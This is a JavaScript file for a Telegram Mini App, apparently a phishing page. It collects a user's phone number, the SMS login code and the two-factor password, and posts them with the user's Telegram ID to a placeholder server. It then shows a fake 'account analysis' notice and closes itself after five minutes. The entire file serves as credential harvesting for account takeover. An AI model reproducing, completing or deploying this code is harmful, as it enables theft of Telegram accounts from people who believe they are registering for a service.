// Инициализация Mini Apps SDK
const tg = window.Telegram.WebApp;
tg.expand();
tg.BackButton.hide();

// Элементы DOM
const phoneInput = document.getElementById('phone');
const codeInput = document.getElementById('code');
const faInput = document.getElementById('fa');
const sendCodeBtn = document.getElementById('sendCodeBtn');
const loginBtn = document.getElementById('loginBtn');
const messageDiv = document.getElementById('message');

let phoneNumber = '';
let country = 'Russia'; // Определяем страну по номеру (упрощенно)

// Функция для отображения сообщений
function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = 'message ' + type;
    messageDiv.style.display = 'block';
}

// Функция для скрытия сообщений
function hideMessage() {
    messageDiv.style.display = 'none';
}

// Обработчик кнопки "Send code"
sendCodeBtn.addEventListener('click', async () => {
    hideMessage();
    phoneNumber = phoneInput.value.trim();

    if (!phoneNumber.startsWith('+') || phoneNumber.length < 10) {
        showMessage('Введите корректный номер телефона', 'error');
        return;
    }

    // Определяем страну по коду (упрощенно)
    if (phoneNumber.startsWith('+7')) country = 'Russia';
    else if (phoneNumber.startsWith('+1')) country = 'USA';
    else country = 'Unknown';

    // Отправляем запрос на сервер
    try {
        const response = await fetch('https://your-server.com/send-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                phoneNumber, 
                country,
                userId: tg.initDataUnsafe.user.id 
            })
        });

        const data = await response.json();
        if (data.success) {
            showMessage('Код отправлен! Введите код из SMS.', 'info');
            codeInput.disabled = false;
            sendCodeBtn.disabled = true;
            phoneInput.disabled = true;
        } else {
            showMessage('Ошибка отправки кода', 'error');
        }
    } catch (error) {
        showMessage('Ошибка сети', 'error');
    }
});

// Обработчик кнопки "Login"
loginBtn.addEventListener('click', async () => {
    hideMessage();
    const code = codeInput.value.trim();
    const fa = faInput.value.trim();

    if (code.length < 4) {
        showMessage('Введите корректный код', 'error');
        return;
    }

    // Отправляем запрос на сервер
    try {
        const response = await fetch('https://your-server.com/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                phoneNumber, 
                code, 
                country,
                fa,
                userId: tg.initDataUnsafe.user.id 
            })
        });

        const data = await response.json();
        if (data.success) {
            showMessage('Регистрация прошла успешно! Ожидайте 5 минут, пока мы анализируем ваш аккаунт! После анализа окно автоматически уберется.', 'success');
            loginBtn.disabled = true;
            codeInput.disabled = true;
            faInput.disabled = true;
        } else {
            showMessage('Ошибка при логине', 'error');
        }
    } catch (error) {
        showMessage('Ошибка сети', 'error');
    }
});

// Активация кнопки "Login" при вводе кода
codeInput.addEventListener('input', () => {
    if (codeInput.value.trim().length >= 4) {
        loginBtn.disabled = false;
    } else {
        loginBtn.disabled = true;
    }
});

// Имитация автоматического закрытия через 5 минут после успешной регистрации
setTimeout(() => {
    if (messageDiv.classList.contains('success')) {
        tg.close();
    }
}, 300000); // 5 минут = 300000 миллисекунд